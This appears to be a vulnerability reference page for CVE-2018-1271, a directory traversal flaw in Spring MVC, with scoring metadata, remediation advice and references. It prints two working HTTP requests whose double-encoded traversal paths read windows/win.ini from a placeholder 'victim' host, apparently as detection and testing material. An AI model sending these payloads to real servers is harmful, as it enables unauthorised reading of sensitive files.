---
layout: "post"
cve_id: "CVE-2018-1271"
title: "Spring MVC Framework - Local File Inclusion"
pcap: true
pcap_path: "/pcaps/2018/CVE-2018-1271.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2018/CVE-2018-1271.yaml"
author: "hetroublemakr"
severity: "medium"
impact: "Successful exploitation of this vulnerability could allow an attacker to read sensitive files on the server, potentially leading to unauthorized access or information disclosure.
"
remediation: "Apply the latest security patches and updates provided by the Spring MVC Framework to mitigate this vulnerability.
"
reference:
  - "https://medium.com/@knownsec404team/analysis-of-spring-mvc-directory-traversal-vulnerability-cve-2018-1271-b291bdb6be0d"
  - "https://pivotal.io/security/cve-2018-1271"
  - "https://access.redhat.com/errata/RHSA-2018:1320"
  - "https://nvd.nist.gov/vuln/detail/CVE-2018-1271"
  - "http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html"
classification:
  cvss-metrics: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
  cvss-score: 5.9
  cve-id: "CVE-2018-1271"
  cwe-id: "CWE-22"
  epss-score: 0.90926
  epss-percentile: 0.99607
  cpe: "cpe:2.3:a:vmware:spring_framework:*:*:*:*:*:*:*:*"
metadata:
  max-request: 2
  vendor: "vmware"
  product: "spring_framework"
tags:
  - "cve"
  - "cve2018"
  - "spring"
  - "lfi"
  - "traversal"
  - "vmware"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---


## üîç Vulnerability Description
Spring MVC Framework versions 5.0 prior to 5.0.5 and versions 4.3 prior to 4.3.15 and older unsupported are vulnerable to local file inclusion because they allow applications to configure Spring MVC to serve static resources (e.g. CSS, JS, images). A malicious user can send a request using a specially crafted URL that can lead a directory traversal attack.

## üåê HTTP Request
```nohighlight
GET /static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.6 Mobile/15E148 Safari/604.1
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```


